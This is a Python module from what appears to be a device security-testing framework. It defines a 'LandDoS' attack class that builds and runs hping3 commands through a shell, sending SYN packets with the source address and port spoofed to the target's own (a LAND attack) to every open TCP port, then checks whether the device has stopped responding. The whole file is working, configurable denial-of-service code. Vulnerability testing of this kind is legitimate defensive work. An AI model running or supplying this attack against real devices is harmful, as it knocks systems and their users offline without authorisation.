from generic_attack import *
import subprocess
import time

log = logging.getLogger(__name__)

class LandDoS(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(LandDoS, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "tcp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["tcp"].keys():
            result.update({"status": "no open ports"})
            return

        packetDataSize = self.config['data_size'] #bytes
        packetCount = self.config['packet_count']
        interval = self.config['interval']
        start_time = time.time()
        maxRetry = 5
        for port in self.device["vulnerable_ports"]["tcp"]["open"]:
            command = "hping3 -V -c %d -i %s -d %d -S -p %d -s %d -a %s %s" % (
            packetCount, interval, packetDataSize, port, port, target, target)
            p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            # This makes the wait possible
            p.wait()
            if (not self.retry_is_alive()):
                log.info('Device not responding!')
                result.update({"status": "vulnerable",
                               "directed_traffic(bytes/sec)": (packetCount * (packetDataSize + 40)) / (
                               time.time() - start_time)})
                return

        result.update({"status": "not_vulnerable", "directed_traffic(bytes/sec)": (packetCount * (packetDataSize + 40))/(time.time() - start_time)})
        return

    def shutdown(self):
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]
